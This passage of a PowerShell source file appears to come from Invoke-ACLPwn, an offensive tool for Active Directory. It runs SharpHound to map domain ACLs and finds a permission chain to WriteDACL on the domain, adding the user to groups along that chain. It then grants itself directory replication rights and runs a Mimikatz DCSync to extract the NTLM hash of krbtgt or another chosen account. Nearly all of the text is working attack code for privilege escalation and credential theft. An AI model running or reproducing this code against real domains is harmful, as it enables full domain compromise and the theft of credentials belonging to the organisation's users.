            "S-1-4"              = "Non-unique Authority"; `
            "S-1-5"              = "NT Authority"; `
            "S-1-5-1"            = "Dialup"; `
            "S-1-5-2"            = "Network"; `
            "S-1-5-3"            = "Batch"; `
            "S-1-5-4"            = "Interactive"; `
            "S-1-5-6"            = "Service"; `
            "S-1-5-7"            = "Anonymous"; `
            "S-1-5-8"            = "Proxy"; `
            "S-1-5-9"            = "Enterprise Domain Controllers"; `
            "S-1-5-10"           = "Principal Self"; `
            "S-1-5-11"           = "Authenticated Users"; `
            "S-1-5-12"           = "Restricted Code"; `
            "S-1-5-13"           = "Terminal Server Users"; `
            "S-1-5-14"           = "Remote Interactive Logon"; `
            "S-1-5-15"           = "This Organization"; `
            "S-1-5-17"           = "IUSR"; `
            "S-1-5-18"           = "Local System"; `
            "S-1-5-19"           = "NT Authority"; `
            "S-1-5-20"           = "NT Authority"; `
            "S-1-5-22"           = "ENTERPRISE READ-ONLY DOMAIN CONTROLLERS BETA"; `
            "S-1-5-32-544"       = "Administrators"; `
            "S-1-5-32-545"       = "Users"; `
            "S-1-5-32-546"       = "Guests"; `
            "S-1-5-32-547"       = "Power Users"; `
            "S-1-5-32-548"       = "BUILTIN\Account Operators"; `
            "S-1-5-32-549"       = "Server Operators"; `
            "S-1-5-32-550"       = "Print Operators"; `
            "S-1-5-32-551"       = "Backup Operators"; `
            "S-1-5-32-552"       = "Replicator"; `
            "S-1-5-32-554"       = "BUILTIN\Pre-Windows 2000 Compatible Access"; `
            "S-1-5-32-555"       = "BUILTIN\Remote Desktop Users"; `
            "S-1-5-32-556"       = "BUILTIN\Network Configuration Operators"; `
            "S-1-5-32-557"       = "BUILTIN\Incoming Forest Trust Builders"; `
            "S-1-5-32-558"       = "BUILTIN\Performance Monitor Users"; `
            "S-1-5-32-559"       = "BUILTIN\Performance Log Users"; `
            "S-1-5-32-560"       = "BUILTIN\Windows Authorization Access Group"; `
            "S-1-5-32-561"       = "BUILTIN\Terminal Server License Servers"; `
            "S-1-5-32-562"       = "BUILTIN\Distributed COM Users"; `
            "S-1-5-32-568"       = "BUILTIN\IIS_IUSRS"; `
            "S-1-5-32-569"       = "BUILTIN\Cryptographic Operators"; `
            "S-1-5-32-573"       = "BUILTIN\Event Log Readers "; `
            "S-1-5-32-574"       = "BUILTIN\Certificate Service DCOM Access"; `
            "S-1-5-32-575"       = "BUILTIN\RDS Remote Access Servers"; `
            "S-1-5-32-576"       = "BUILTIN\RDS Endpoint Servers"; `
            "S-1-5-32-577"       = "BUILTIN\RDS Management Servers"; `
            "S-1-5-32-578"       = "BUILTIN\Hyper-V Administrators"; `
            "S-1-5-32-579"       = "BUILTIN\Access Control Assistance Operators"; `
            "S-1-5-32-580"       = "BUILTIN\Remote Management Users"; `
            "S-1-5-33"           = "Write Restricted Code"; `
            "S-1-5-64-10"        = "NTLM Authentication"; `
            "S-1-5-64-14"        = "SChannel Authentication"; `
            "S-1-5-64-21"        = "Digest Authentication"; `
            "S-1-5-65-1"         = "This Organization Certificate"; `
            "S-1-5-80"           = "NT Service"; `
            "S-1-5-84-0-0-0-0-0" = "User Mode Drivers"; `
            "S-1-5-113"          = "Local Account"; `
            "S-1-5-114"          = "Local Account And Member Of Administrators Group"; `
            "S-1-5-1000"         = "Other Organization"; `
            "S-1-15-2-1"         = "All App Packages"; `
            "S-1-16-0"           = "Untrusted Mandatory Level"; `
            "S-1-16-4096"        = "Low Mandatory Level"; `
            "S-1-16-8192"        = "Medium Mandatory Level"; `
            "S-1-16-8448"        = "Medium Plus Mandatory Level"; `
            "S-1-16-12288"       = "High Mandatory Level"; `
            "S-1-16-16384"       = "System Mandatory Level"; `
            "S-1-16-20480"       = "Protected Process Mandatory Level"; `
            "S-1-16-28672"       = "Secure Process Mandatory Level"; `
            "S-1-18-1"           = "Authentication Authority Asserted Identityl"; `
            "S-1-18-2"           = "Service Asserted Identity"
    }

    $result = $true
    
    # Import assemblies
    Add-Type -AssemblyName System.DirectoryServices    
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
    Add-Type -AssemblyName System.IO.Compression.FileSystem

    if ($logToFile){
        "$("`r`n")$('='* 120)" | Out-File 'Invoke-ACLPwn.log' -Append
    }


    # Check if computer is part of the domain
    $partOfDomain = (Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

    if (-not $partOfDomain -and (-not $username -or -not $password -or -not $domain)){        
        Write-Bad 'Computer is not part of a domain. Please specify credentials.'
        return $false
    }

    if (-not $partOfDomain -and -not $integratedLogin) {
    
        if ($global:ldapConnInfo.username.Contains("\")){
            $global:ldapConnInfo.username = $global:ldapConnInfo.username.Split("\")[1]
        }

        # Write AddtoGroup and Add-ACL to file
        Write-AddACEToFile
        Write-AddToGroupToFile
    }
    
    # Check if domain is specified. If not, and we're part of the domain try to resolve it
    if ([string]::IsNullOrEmpty($global:ldapConnInfo.domain)){
        if ($partOfDomain){
            $global:ldapConnInfo.domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
            $global:ldapConnInfo.Integrated_Login = $true

            if ([string]::IsNullOrEmpty($protocol)) {
                $protocol = 'LDAP'
            }

            $global:ldapConnInfo.protocol = $protocol
            $global:ldapConnInfo.LDAPConnString  = "$($global:ldapConnInfo.protocol)://$($global:ldapConnInfo.domain)"
        } else {        
            Write-Bad 'Computer is not part of a domain. Please specify domain.'
            return $false
        }
    }

     # Get current username if none is given
    if ([string]::IsNullOrEmpty($global:ldapConnInfo.username)) {
        $global:ldapConnInfo.username = [System.Environment]::UserName
        Write-Status "Integrated login, using account '$($global:ldapConnInfo.username)'"
    }

    # Check if we can login
    Write-Status 'Checking if we can bind to AD...'
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString    

    if ([string]::IsNullOrEmpty($dirEntry.DistinguishedName)) {
        Write-Bad '[Check-Env] Unable to connect. Check settings.'
        $result = $false
    }
    else {   
        Write-Status 'Succesfully bound to AD with supplied info.'
    }

    if (-not $dirEntry.Disposed) {
        $dirEntry.Close()
        $dirEntry.Dispose()
    }

    # Get domain DN
    $domainDN = Get-DomainDN
    $global:ADInfo.domainDN = $domainDN

    # Get PDC
    Write-Status 'Finding primary DC...'
    $pdc = Get-PrimaryDC35

    if ([string]::IsNullOrEmpty($pdc)) {
        Write-Bad 'We need a (primary) domainController for this to work. Stopping...'
        $result = $false
    }
    else {
        Write-Status "Found PDC '$pdc'"
        $global:ADInfo.primaryDC = $pdc
    }

    # Get naming- and schema context DN
    Write-Status 'Finding Naming context for Configururation and Schema stores partitions...'
    Get-SchemaAndConfigContext
    Write-Status "Found configstore: $($global:ADInfo.ConfigurationNamingContext)"
    Write-Status "Found schemastore: $($global:ADInfo.schemaNamingContext)"


    # find additional info about user
    $attr = @('userPrincipalName','distinguishedName','sAMAccountName')
    $attrs = Get-AttrForADObject -objectName $global:ldapConnInfo.username -props $attr
    $global:ldapConnInfo.sAMAccountName    = $attrs['samaccountname'][0]
    $global:ldapConnInfo.userPrincipalName = $attrs['userprincipalname'][0]
    $global:ldapConnInfo.distinguishedName = $attrs['distinguishedname'][0]

    if ([string]::IsNullOrEmpty($SharpHoundLocation)) {
         Write-Bad 'SharpHound not found. Please specify sharphound location'
        return $false
    }

    if (-not (Test-Path $SharpHoundLocation)){
        Write-Bad 'SharpHound not found. Please specify sharphound location'
        $result = $false
    }

    # Test if $userAccountToPwn exists
    if ([string]::IsNullOrEmpty($userAccountToPwn)) {
        $userAccountToPwn = 'krbtgt'
    }
    $acc = Get-AttrForADObject $userAccountToPwn -props 'sAMAccountName' 
    if ($acc -eq $null) {
        Write-Status "Account '$userAccountToPwn' not found in AD. krbtgt account will be used."
        $userAccountToPwn = 'krbtgt'
    }

    return $result
}
#endregion

#region HackPwnStuff

function Get-ACLString($ref) {

    return ("{0}{1}{2}{3}{4}{5}{6}{7}" -f `
        $ref.ObjectName,
        $ref.ObjectType,
        $ref.PrincipalName,
        $ref.PrincipalType,
        $ref.ActiveDirectoryRights,
        $ref.ACEType,
        $ref.AccessControlType,
        $ref.IsInherited,
        $ref.ObjectGuid)
}

function Get-PwnChain ($objACL, $groupMembership) {

    $processed = New-Object System.Collections.ArrayList 
    $checkList = New-Object System.Collections.ArrayList

    foreach ($a in $objACL | ForEach-Object {$_.PrincipalName}){

  
        # Get ACL for the Id ref of the ACE. 
        # Check if we havent checked this ACE before
        $aAcl = @()
        
        $ACL | Where-Object {$_.objectName -eq $a} | ForEach-Object {          
            #[void]$processed.Add($_)            
            $aAcl += $_
        }

        # Iterate through the ACL of the ACE Id ref
        # Todo: check accesstype. Skip read entries        
        for ($i = 0; $i -lt $aAcl.Count; $i++){

            $subACL = $aAcl[$i]        

            # Get ACL for this resource and add it to the queue
            $ACL | Where-Object {$_.objectName -eq "$($subACL.PrincipalName)"} | ForEach-Object {    

                $aStr = Get-ACLString $_                
                if (-not $checkList.Contains($aStr)){
                    [void]$checkList.Add($aStr)
                    $aAcl += $_
                }
            }

            # Check members of this group. We know we are not a member of this group since we already requested our
            # recursive groupmembership, but it could lead to ownage if we can modify the children
            $groupChilderen = Get-GroupMember -objectName $subACL.PrincipalName        

            # Get ACL for every child and add them to the queue
            foreach ($child in $groupChilderen) {                        
                $ACL | Where-Object {$_.objectName -like "$($child.NTAccount)*"} | ForEach-Object {               
                    $aStr = Get-ACLString $_                
                    if (-not $checkList.Contains($aStr)){
                        [void]$checkList.Add($aStr)
                        $aAcl += $_
                    }
                }                 
            }

            # Keep track of what we already have processed
            [void]$processed.Add($subACL)            

            if ($processed.Count % 25 -eq 0){
                Write-Status "Processed $($processed.Count) ACLs so far..."
            }
        }
    }

    # TODO: tmp fix, make processedlist unique    
    $processed = $processed | Sort-Object -Property ObjectName, ObjectType, PrincipalName, PrincipalType, ActiveDirectoryRights, ACEType, AccessControlType, IsInherited, ObjectGuid -Unique

    # Check if we are member of one of the processed groups
    $pwnableIds = $groupMembership | Where-Object {
        $processed.PrincipalName -like "$($_.NTAccount)*"
    }

    $pwnChain = @()

    foreach ($pwnID in $pwnableIds) {
        # find ACE where this NTAccount is the principle
        $unResolved = $true
        $_pwnChain = @()

        $idRef = "$($pwnID.NTAccount)@$($global:ldapConnInfo.domain)"

        do {

            # TODO: fix when multiple references are found
            $relatedACE = $processed | Where-Object {$_.PrincipalName -eq $idRef } 

            if ($relatedACE.Count -gt 1) {
                Write-Status 'Found multiple potential paths to AD pwnage. Using the first group that was processed. Later on, multiple paths will be supported.'
                $relatedACE = $relatedACE[0]
                $unResolved = $false
            }    
            
            if ($relatedACE -eq $null){

                # No ACE available. Check if group is a direct(!) member of the group in the upper layer
                $memberOfGroup = Get-Groupmembership -objName $idRef -recursive $false 

                $isMemberOfGroup = $memberOfGroup | Where-Object {
                    $objACL.PrincipalName -eq "$($_.NTAccount)@$($global:ldapConnInfo.domain)"
                }

                if ($isMemberOfGroup -ne $null){
                    #done :)
                    $_pwnChain += New-Object PSObject -Property @{
                        'Type' = 'GroupMembership'
                        'Object' = $idRef
                    }                

                    $unResolved = $false
                    continue
                }

                $unResolved = $true
                break
            }
            
            # Add idRef ACE to pwnChain
            $_pwnChain += New-Object PSObject -Property @{
                'Type' = 'ACL'
                'Object' = $relatedACE
            }
            

            # Set $idREf to objectName that is mentioned in $relatedACE
            $idRef = $relatedACE.ObjectName

        }while($unResolved)

        $pwnChain += $_pwnChain
    }

    return $pwnChain
}

function Import-CSVACL ($csvLocation) {

    if (-not (Test-Path $csvLocation)) {
        Write-Error ("[Import-ACL] File '{0}' not found." -f $csvLocation)
        return null
    }

    # Return the ACE where allowedType -eq True
    $_tmp = Import-Csv $csvLocation
    $r = $_tmp | Where-Object {$_.AccessControlType -eq 'AccessAllowed'}

    return $r
}

function Is-NewSharphoundVersion([string]$sharphoundLocation){

    $result = $false

    # Dirty hack to get sharphound version :(
    $tmpPath = [system.IO.Path]::GetTempPath()
    Start-process -wait -WindowStyle Hidden -filePath $sharphoundLocation -ArgumentList "-h" -RedirectStandardError "$tmpPath\out2.txt"

    $sharpHoundHelp = Get-Content "$tmpPath\out2.txt"    
    $sharphoundVersion = ($sharpHoundHelp -split '`r`n')[0]
    Write-Status "Running $($sharphoundVersion)..." 

    if ($sharphoundVersion.ToLower().Contains("sharphound v2")){
        $result = $true
    }

    Remove-Item "$tmpPath\out2.txt"
    return $result
}

function Get-SharpHoundACL ([string]$sharpHoundLocation, $isNewVersion) {
    
    $fileName = [string]::Empty
    $arg = [string]::Empty

    if ($isNewVersion){
        $fileName = "{0}.zip" -f [datetime]::Now.ToFileTime()
        $arg = "$($global:ldapConnInfo.domain) -c acl --ZipFileName $($fileName) --NoSaveCache"
    } else {
        $fileName = "{0}" -f [datetime]::Now.ToFileTime()
        $arg = "-d $($global:ldapConnInfo.domain) -c acl --CSVPrefix $($fileName) --NoSaveCache"
    }

    Invoke-Cmd -cmd $sharpHoundLocation -argV $arg

    $stillRuns     = $true
    $maxSleepTime  = 10 # In minutes 
    $sleepElapsed  = 0
    $sleepInterval = 5  # In seconds
    
    # Sleep a little, check if file exists if we wake up
    Start-Sleep $sleepInterval
    $file = Get-ChildItem -Filter "$fileName*"
    if ($file -ne $null) {
        return $file[0].FullName
    }

    do {
        # check if sharphound is still running
        $p = Get-Process '*SharpHound.exe'
        if ($p -eq $null) {
            $stillRuns = $false
        } else {
            # Sleep 5 seconds
            Start-Sleep($sleepInterval)
            $sleepElapsed += $sleepInterval

            if (($maxSleepTime *10) -le $sleepElapsed){
                Write-Status '[Get-SharpHoundACL] Sharphound is still running. Do you want to continue for 10 more minutes?' 
                $answ = Read-Host 'Y/N'
                if ($answ.ToLower() -eq 'y') {
                    $maxSleepTime += 10
                } else {
                    $stillRuns = $false
                }
            }
        }        
    }while ($stillRuns)
    
    # Check for file with given prefix
    $file = Get-ChildItem -Filter "$fileName*"
    if ($file -eq $null) {
        Write-Error '[Get-SharpHoundACL] No ACL input available.'
        return $null
    }

    return $file[0].FullName
}

function Import-JsonACL ([string]$sharpHoundZipFileLocation){

    # unzip file
    $fInfo = New-Object System.IO.FileInfo $sharpHoundZipFileLocation
    $parentFolder = $fInfo.Directory.FullName
    Unzip-Archive -ziparchive $sharpHoundZipFileLocation -extractpath $parentFolder    
    $sharpHoundOutputFiles = Get-Childitem -Path $parentFolder -Filter "*.json"

    # Keep track of file that were created. We want to remove these files later
    $global:filesCreated += $sharpHoundZipFileLocation
    $sharpHoundOutputFiles.FullName | ForEach-Object {
        $global:filesCreated += $_
    }
    
    $result = @()
    foreach ($jsonFile in $sharpHoundOutputFiles){

        $content = Get-Content $jsonFile.FullName        

        if ([string]::IsNullOrEmpty($content)){
            continue
        }

        $tmp = ConvertFrom-Json $content -ErrorAction SilentlyContinue

        # iterate through objects
        $objectType = $tmp.meta.type
        foreach ($i in $tmp."$objectType"){
            
            $objectName = $i.Name

            # Iterate through ACEs
            foreach ($a in $i.Aces) {            
                $result += New-Object PSObject -Property @{
                        'ObjectName'            = $objectName
                        'ObjectType'            = $objectType
                        'PrincipalName'         = $a.PrincipalName
                        'PrincipalType'         = $a.PrincipalType
                        'ActiveDirectoryRights' = $a.RightName
                        'ACEType'               = $a.AceType
                        'AccessControlType'     = 'AccessAllowed'               
                }
            }
        }
    }

    return $result
}

function Unzip-Archive {
    #thx: https://www.saotn.org/unzip-file-powershell/
    param( [string]$ziparchive, [string]$extractpath )
    [System.IO.Compression.ZipFile]::ExtractToDirectory( $ziparchive, $extractpath )
}


function Add-ReplicationPartner {
    
    # Retrieve SID based on actual info from the domain
    $userAdObj = Get-AttrForADObject -objectName $global:ldapConnInfo.username -props 'objectSid'
    $userSID = New-Object System.Security.Principal.SecurityIdentifier $userAdObj['objectSid'][0], 0    

    # Get GUID for 'replicating changes (all)'
    $replicationGUID = (Get-ExtendedRightByName -displayname 'Replicating Directory Changes')
    $replicationAllGUID = (Get-ExtendedRightByName -displayname 'Replicating Directory Changes All')

    if ($WhatIf){
        Write-Status "WhatIf: Setting 'Replicating Directory Changes' permissions for user $($global:ldapConnInfo.username)"
        Write-Status "WhatIf: Setting 'Replicating Directory Changes All' permissions for user $($global:ldapConnInfo.username)"
        return
    }
    
    $integratedLogin = $global:ldapConnInfo.Integrated_Login
    $userSIDString   = $userSID.Value
    $rightType       = 'ExtendedRight'
    $action          = 'Allow'

    # Build up two ACEs
    $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
    $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
    $replACE    = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $userSID, $rightType, $action, $replicationGUID,    $inheritanceType, $nullGUID
    $replAllACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $userSID, $rightType, $action, $replicationAllGUID, $inheritanceType, $nullGUID
    
    # Store arrays
    $global:ACEs += $replACE
    $global:ACEs += $replAllACE

    if (-not $integratedLogin){
        # Build up parameters
        $scriptParam = ("-userSIDString `"{0}`" -rightType `"{1}`" -action `"{2}`"" -f `
                        $userSIDString, $rightType, $action)

        if ($global:ldapConnInfo.Integrated_Login){
            $scriptParam += " -integratedLogin"
        }

        # Apply Replication Changes ACE
        $_param = $scriptParam + " -propertyGUID `"$($replicationGUID)`""    
        $sResult = Start-PSScript -scriptLoc $global:ACEScript -scriptParam $_param 

        if ($sResult -ne 'Done')  {
            Write-Bad 'Error occured while setting ACL'
            Write-Bad $sResult
            return $false
        }         
        
        # Apply Replication Changes All ACE
        $sResult = [string]::Empty
        $_param  = $scriptParam + " -propertyGUID `"$($replicationAllGUID)`""    
        $sResult = Start-PSScript -scriptLoc $global:ACEScript -scriptParam $_param 

        if ($sResult -ne 'Done')  {
            Write-Bad 'Error occured while setting ACL'
            return $false
        }    

        return $true
    } else {

        # Retrieve domain object
        $domainDN = Get-DomainDN
        $domainDirEntry = Get-DirEntry $domainDN
        
        # Set securitymasks for DACL only
        $secOptions = $domainDirEntry.get_Options()
        $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
        $domainDirEntry.RefreshCache()

        # Add our new created ACEs
        $domainDirEntry.get_ObjectSecurity().AddAccessRule($replACE)
        $domainDirEntry.get_ObjectSecurity().AddAccessRule($replAllACE)
        $domainDirEntry.CommitChanges()
    
        $domainDirEntry.dispose()

        return $true
    }
}

function Invoke-DCSync ($mimiKatzLocation, $accountToPwn) {
    
    if (-not (Test-Path $mimiKatzLocation)) {
        Write-Bad 'Mimikatz not found. Quitting.'
        return
    }

    $argV = "`"lsadump::dcsync /domain:$($global:ldapConnInfo.domain) /user:$accountToPwn@$($global:ldapConnInfo.domain)`" exit"

    # We cannot get the results from mimikatz itself (we need to de \r\n after issuing log, which is not possible atm)
    # Write a batchfile that does the same
    $output_fName = "$([System.DateTime]::Now.ToFileTime())_mimiOutput.txt"
    $output_batchFile = "$([System.DateTime]::Now.ToFileTime())_mimi.bat"

    $global:filesCreated += $output_fName
    $global:filesCreated += $output_batchFile
    "`"$($mimiKatzLocation)`" $argV > $output_fName" | Out-File $output_batchFile -Encoding ascii

    Invoke-Cmd -cmd 'C:\Windows\System32\cmd.exe' -argV " /c $output_batchFile"

    # the invoke-runas runs async, wait for the file to be created.
    $fileBeingCreated = $true
    do {
        if (-not (Test-Path -Path $output_fName)) {
            Start-Sleep(1)                
        } else {
            $fileBeingCreated = $false
        }
        
    }while ($fileBeingCreated)

    $result = Get-content $output_fName
    $rHash = $result | Where-Object {$_ -match 'Hash NTLM\:\s(?<ntlm_hash>.+)'}

    if ([string]::IsNullOrEmpty($rHash)) {
        
        Write-Bad 'Did not find NTLM hash due to following error:'
        Write-Bad ($result | Where-Object {$_.Startswith('ERROR')})
        return
    }

    $ntlmHASH = $rHash.Split(' ')[-1]
    return $ntlmHASH
}

function Remove-ReplicationPartner {
    
    # Retrieve domain object
    $domainDN = Get-DomainDN
    $domainDirEntry = Get-DirEntry $domainDN

    # Set securitymasks for DACL only
    $secOptions = $domainDirEntry.get_Options()
    $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl

    # Add our new created ACEs
    foreach ($a in $global:ACEs) {
        [void]$domainDirEntry.get_ObjectSecurity().RemoveAccessRule($a)
    }
    
    $domainDirEntry.CommitChanges()   
    $domainDirEntry.dispose()
}

function Repl-Pwn {

    # Add our dear self as replication partner
    Write-Status 'Adding ourself as potential replication partner...'
    if (-not (Add-ReplicationPartner)){
        return
    }
    Write-Good 'Succesful! We can now start replicating some stuff, hold on...'

    # Invoke Mimikatz, read console output
    if (-not $NoDCSync){
        $mimiResult = Invoke-DCSync -mimiKatzLocation $mimiKatzLocation -accountToPwn $($userAccountToPwn)

        if (-not [string]::IsNullOrEmpty($mimiResult)) {
            Write-Good "Got hash for '$($userAccountToPwn)' account: $mimiResult"
        }
    }
}

#endregion

#region Structures



# global variable with files that are created on runtime
$global:filesCreated = @()

# Contains groups that the userwas added to
$global:GroupAdded   = @()
#endregion

# check if we can run the script
if (-not (Check-Env)) {
    Get-Help
    return
}

# Get groupmembership for supplied useraccount
Write-Status "Retrieving groupmembership for user $($global:ldapConnInfo.username)..."
$groupMembership = Get-Groupmembership -objName $($global:ldapConnInfo.username) -recursive $true
Write-Status "User '$($global:ldapConnInfo.username)' is member of $($groupMembership | Measure-Object | ForEach-Object {$_.Count}) group(s)"

# Get object class from schema
Write-Status "Getting schema classes..."
$global:ADInfo.schemaClasses = Get-SchemaClasses
Write-Status "Found $($global:ADInfo.schemaClasses.Count) schema classes"

# Get translation for extended rights
Write-Status "Getting extended rights from schema..."
$global:ADInfo.extendedRights = Get-ExtendedRights
Write-Status "Found $($global:ADInfo.extendedRights.Count) extended rights"

# Run Sharphound to collect ACL of the target domain
$isnewSharpHoundVersion = Is-NewSharphoundVersion -sharphoundLocation $SharpHoundLocation
$aclInputPath = Get-SharpHoundACL -sharpHoundLocation $sharpHoundLocation  -isNewVersion $isnewSharpHoundVersion
$global:filesCreated += $aclPath

if ($aclInputPath -eq $null) {
    return
}

# Import csv
if ($isnewSharpHoundVersion){
    $ACL = Import-JsonACL -sharpHoundZipFileLocation $aclInputPath
} else{
    $ACL = Import-CSVACL -csvLocation $aclInputPath
}
Write-Status "Found $($ACL.Count) ACLs"

# Iterate writeDACL and fullcontrol permissions on the domain object
$domainObjectTypeName = "domain"
if ($isnewSharpHoundVersion) {
    $domainObjectTypeName = "domains" # dunno if typo?
}

$domainACL       = $ACL | Where-Object {$_.ObjectType -eq $domainObjectTypeName}
$writeDACLDomain = $domainACL | Where-Object {$_.ActiveDirectoryRights -eq 'WriteDacl'}
$writeDACLDomain += $domainACL | Where-Object {$_.ActiveDirectoryRights -eq 'GenericAll'}

# Arrays with permissions
$currWriteDaclPerm = @()

# Check if we have writeDACL permissions
foreach ($g in $groupMembership){
    $currWriteDaclPerm += $writeDACLDomain | Where-Object {$_.PrincipalName.ToString().ToLower() -like "$($g.NTAccount.ToLower())*"}
}

if ($currWriteDaclPerm.Count -ge 1) {
    Write-Good 'Got WriteDACL permissions.'

    Repl-Pwn

    # Done.
    Invoke-Cleanup
    return
}

# with these permissions we can possibly pwn via another way
#$PwnPermissions = @('GenericAll','WriteProperty','owner','WriteOwner')
#$PwnAttributes  = @('member','owner','WriteDacl')

Write-Status 'Parsing ACL. This might take a while...'
$pwnPath = Get-PwnChain -objACL $writeDACLDomain -groupMembership $groupMembership

if ($pwnPath -eq $null){
    Write-Status 'No chain found :('
    return
} 

Write-Good 'Found chain!'

# chain is in chronological order
foreach ($c in $pwnPath) {
   
    if ($c.Type -eq 'ACL') {
           
        $attr    = $c.Object.ACEType
        $adRight = $c.Object.ActiveDirectoryRights

        # Can we modify groupmembership?
        if (($attr -eq 'Member' -and $adRight -eq 'WriteProperty') -or $adRight -eq 'GenericAll'){            
            
            # Get distinguishedName 
            $groupDN = Get-DistinguishedNameForObject -obj $($c.Object.ObjectName)

            # Dry run
            if ($WhatIf) {
                Write-Status "WhatIf: Added user '$($global:ldapConnInfo.username)' to group $groupDN" 
                continue
            }

            # TODO: Credentials remain in memory. Flush credentials
            # Start new process process and call script to add user to group if we're not using integrated login
            if ($global:ldapConnInfo.Integrated_Login){
                $sResult = Set-GroupMembership -groupDN $groupDN
            } else {
                $sResult = Start-PSScript -scriptLoc $global:AddToGroupScriptFile -scriptParam "-groupDN `"$groupDN`" -userDN `"$($global:ldapConnInfo.distinguishedName)`""  
            }

            if ($sResult -ne 'Done') {
                Write-Bad "Error adding user to group: $($groupDN)"
            } else {
                Write-Status "Added user '$($global:ldapConnInfo.username)' to group $groupDN" 
                $global:GroupAdded += $groupDN
            }
        }
    }

    if ($c.Type -eq 'GroupMembership') {
         # We need to add ourself to a group, we can skip for now.
    }

    # Sleep 0.5 seconds to avoid replication issues, etc
    Start-sleep -Seconds 0.5
}

# TODO: fix this in a nicer way (maybe in the pwnchain)
# for now, just get groupmembership of the user and check if we have writeDacls permissions
$currWriteDaclPerm = @()
$groupMembership = Get-Groupmembership -objName $global:ldapConnInfo.username -recursive $true
foreach ($g in $groupMembership){
    $currWriteDaclPerm += $writeDACLDomain | Where-Object {$_.PrincipalName.ToString().ToLower() -like "$($g.NTAccount.ToLower())*"}
}

if ($currWriteDaclPerm.Count -ge 1) {
    Write-Good 'Got WriteDACL permissions!'

    # Clear errors
    $errCount = $Error.Count

    Repl-Pwn

    if ($Error.Count -gt $errCount){
        Write-Status 'It looks like some errors occured. If it is related to insufficient access, try running the script again'
    }
}

# Cleanup
Invoke-Cleanup
